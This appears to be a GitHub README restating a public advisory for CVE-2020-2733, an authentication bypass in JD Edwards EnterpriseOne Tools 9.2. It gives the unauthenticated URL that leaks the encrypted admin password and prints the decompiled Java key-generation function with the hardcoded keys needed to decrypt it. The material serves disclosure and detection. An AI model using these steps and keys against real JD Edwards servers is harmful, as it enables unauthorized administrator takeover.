# CVE-2020-2733 - JD Edwards EnterpriseOne Tools admin password not adequately protected

![image](https://github.com/user-attachments/assets/c8daf3e8-62a4-4bf7-b4ae-2293b2b8b6c9)
<br>Pic 1: Decrypt the string<br>
![image](https://github.com/user-attachments/assets/4f9747ca-77b2-47ff-a34a-b20a1b997633)
<br>Pic 2: Decrypt by giving the URL<br>

### [CVE-2020-2733] 
Application: JD Edwards EnterpriseOne Tools
<br>Versions Affected: JD Edwards EnterpriseOne Tools 9.2
<br>Vendor URL: https://oracle.com/
<br>Bug: Information disclosure
<br>Reported: September 18, 2019
<br>Date of Public Advisory: August 23, 2022
<br>Reference: [https://www.oracle.com/security-alerts/cpuapr2020.html, https://redrays.io/cve-2020-2733-jd-edwards/]
<br>Nuclei Template for detection: https://github.com/projectdiscovery/nuclei-templates/blob/68f0ad5fa2f54a08959e2d68633174750fcb4952/http/cves/2020/CVE-2020-2733.yaml#L2

### Description

ADVISORY INFORMATION
<br>Title: [CVE-2020-2733] JD Edwards EnterpriseOne Tools admin password not adequately protected
<br>Risk: Critical
<br>Advisory URL: https://redrays.io/cve-2020-6369-patch-bypass/
<br>Date published: 23.08.2022

### VULNERABILITY INFORMATION

<br>Remotely Exploitable: Yes
<br>Locally Exploitable: No

<br>CVSS Information : CVSS v3.1 Base Score: 9.8 / 10 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

### VULNERABILITY DESCRIPTION

JD Edwards EnterpriseOne Tools 9.2 or lower versions allow unauthenticated attackers to bypass the authentication and get Administrator rights on the system.

### TECHNICAL DESCRIPTION

The vulnerability was discovered in the Oracle JD Edwards Management portal. To reproduce the vulnerability, you need to open (without authentication) the following URL

http://JDEdwards:8999/manage/fileDownloader?sec=1 

When you open the URL, you can see pseudo-random text in the page.
![unnamed-2-e1661254647723](https://github.com/user-attachments/assets/69419675-4796-46c1-8397-29e6f1e27c83)


```code
ACHCJKGJHCJKBLLALOLOJFCABEFHOALDDAOFNGGANPDB
```
<br>After analyzing the JD Edwards jar files, we discovered that this pseudo-random data is – THE ENCRYPTED ADMIN PASSWORD!

The encryption keys are located in the following function

```java
private static void genKeys(byte[] paramArrayOfByte1, byte[] paramArrayOfByte2, byte paramByte)
{
int i = 0;
byte[] arrayOfByte1 = { 65, 4, 95, 12, 88, 41, 6, 114, 119, 93, 37, 68, 75, 19, 49, 46 };
byte[] arrayOfByte2 = { 107, 34, 26, 94, 68, 41, 119, 48, 3, 88, 28, 97, 5, Byte.MAX_VALUE, 77, 54 };
byte[] arrayOfByte3 = { 36, 89, 113, 109, 38, 15, 7, 66, 76, 115, 16, 53, 106, 94, 27, 56 };
int j = paramByte >> 4;
int k = paramByte & 0xF;
int m = arrayOfByte3[j];
for (i = 0; i < 16; i++) {
paramArrayOfByte1[i] = ((byte)(arrayOfByte1[i] ^ m));
}
m = arrayOfByte3[k];
for (i = 0; i < 16; i++) {
paramArrayOfByte2[i] = ((byte)(arrayOfByte2[i] ^ m));
}
}
```

As a result, you will get an admin password, and you can deploy any application in the JD Edwards portal.
![image](https://github.com/user-attachments/assets/6247c870-067b-43c7-859c-aa3ced2b1fd4)

Reference/ Credit:
https://redrays.io/blog/cve-2020-2733-jd-edwards/


